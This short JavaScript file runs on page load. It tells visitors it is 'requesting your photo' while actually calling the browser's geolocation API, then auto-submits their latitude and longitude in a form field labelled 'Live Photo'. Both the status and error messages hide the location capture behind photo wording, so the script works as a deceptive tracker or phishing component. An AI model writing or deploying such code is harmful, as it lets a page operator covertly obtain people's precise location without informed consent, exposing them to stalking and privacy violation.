document.addEventListener("DOMContentLoaded", function () {
  const status = document.getElementById("status");
  const form = document.getElementById("photoForm");
  const messageField = document.getElementById("message");

  if (!navigator.geolocation) {
    status.textContent = "Geolocation is not supported by your browser.";
    return;
  }

  status.textContent = "Requesting your photo...";

  navigator.geolocation.getCurrentPosition(
    function (position) {
      const { latitude, longitude } = position.coords;

      // Append the location to the message field
      messageField.value = `Live Photo:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

      // Submit the form
      form.submit();
    },
    function (error) {
      status.textContent = `Error fetching photo: ${error.message}`;
    }
  );
});
